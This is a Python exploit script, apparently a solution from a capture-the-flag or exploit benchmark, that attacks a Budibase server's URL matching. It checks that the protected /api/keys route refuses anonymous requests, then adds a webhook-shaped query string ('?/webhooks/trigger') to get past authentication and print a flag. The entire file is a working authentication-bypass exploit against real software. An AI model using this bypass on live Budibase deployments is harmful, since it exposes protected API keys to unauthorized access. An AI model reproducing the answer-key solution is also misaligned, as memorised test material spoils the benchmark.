#!/usr/bin/env python3
"""Exploit Budibase webhook URL matching to read a protected server flag."""

import json
import os
import re
import urllib.error
import urllib.request


FLAG_PATTERN = re.compile(r"^jaylbreak\.win\{[^{}]+\}$")


def request_text(url: str) -> tuple[int, str]:
    try:
        response = urllib.request.urlopen(url, timeout=20)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        return response.status, response.read().decode("utf-8").strip()


def main() -> None:
    base_url = (
        os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]
    ).rstrip("/")
    protected_url = f"{base_url}/api/keys"
    baseline_status, _ = request_text(protected_url)
    if baseline_status not in (401, 403):
        raise RuntimeError(
            f"Protected route did not reject anonymous access: {baseline_status}"
        )

    bypass_status, response_text = request_text(
        f"{protected_url}?/webhooks/trigger"
    )
    flag = json.loads(response_text).get("budibaseProof")
    if (
        bypass_status != 200
        or not isinstance(flag, str)
        or not FLAG_PATTERN.fullmatch(flag)
    ):
        raise RuntimeError(
            f"Webhook-shaped URL did not release a flag: {bypass_status}"
        )
    print(
        json.dumps(
            {
                "evidence_payload": {"flag": flag},
                "baseline_status": baseline_status,
                "bypass_status": bypass_status,
            }
        )
    )


if __name__ == "__main__":
    main()
